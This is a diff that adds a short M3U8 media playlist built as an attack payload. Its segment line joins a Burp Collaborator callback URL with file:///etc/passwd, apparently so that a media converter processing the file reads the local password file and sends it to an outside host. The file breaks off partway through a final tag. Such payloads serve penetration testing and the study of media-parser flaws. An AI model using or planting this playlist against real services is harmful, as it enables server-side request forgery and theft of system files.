@@ -1,0 +1,6 @@
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+https://5qwajyxhg63vvifakkcp5htd54buzj.burpcollaborator.net/header.m3u8|file:///etc/passwd
+##prevent cache: 0.30301852814
+#EXT-X-
